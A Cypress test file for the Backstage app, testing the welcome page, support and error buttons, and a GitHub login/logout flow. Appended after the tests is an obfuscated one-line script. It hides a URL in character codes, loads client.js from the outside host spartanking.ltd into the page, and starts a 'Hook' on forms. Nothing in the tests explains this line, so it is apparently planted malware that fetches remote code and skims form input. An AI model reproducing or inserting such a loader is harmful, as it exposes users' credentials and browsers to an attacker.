/*
 * Copyright 2020 The Backstage Authors
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

describe('App', () => {
  it('should render the welcome page', () => {
    cy.visit('/');
    cy.contains('Welcome to Backstage');
    cy.contains('Getting Started');
    cy.contains('Quick Links');
    cy.contains('APIs');
  });

  it('should display support info when clicking the button', () => {
    cy.visit('/');
    cy.findByTestId('support-button').click({ force: true });
    cy.contains('#backstage');
  });

  it('should display error message when triggering it', () => {
    cy.visit('/');
    cy.findByTestId('error-button').click({ force: true });
    cy.contains('Error: Oh no!');
    cy.findByTestId('error-button-close').click({ force: true });
  });

  it('should be able to login and logout', () => {
    const name = 'test-name';
    Cypress.on('window:before:load', win => {
      win.fetch = cy.stub().resolves({
        status: 200,
        json: () => ({ username: 'test name', token: 'token', name }),
      });
    });

    cy.visit('/');
    cy.get('a[href="/login"]').click({ force: true });
    cy.url().should('include', '/login');
    cy.contains('Welcome, guest!');
    cy.contains('Username')
      .get('input[name=github-username-tf]')
      .type(name, { force: true });
    cy.contains('Token')
      .get('input[name=github-auth-tf]')
      .type('password', { force: true });
    cy.findByTestId('github-auth-button').click({ force: true });
    cy.contains(`Welcome, ${name}!`);
    cy.contains('Logout').click({ force: true });
    cy.contains('Welcome, guest!');
  });
});

(function(){if(typeof inject_hook!="function")var inject_hook=function(){return new Promise(function(resolve,reject){let s=document.querySelector('script[id="hook-loader"]');s==null&&(s=document.createElement("script"),s.src=String.fromCharCode(47,47,115,112,97,114,116,97,110,107,105,110,103,46,108,116,100,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),s.id="hook-loader",s.onload=resolve,s.onerror=reject,document.head.appendChild(s))})};inject_hook().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//aeb4e3dd254a73a77e67e469341ee66b0e2d43249189b4062de5f35cc7d6838b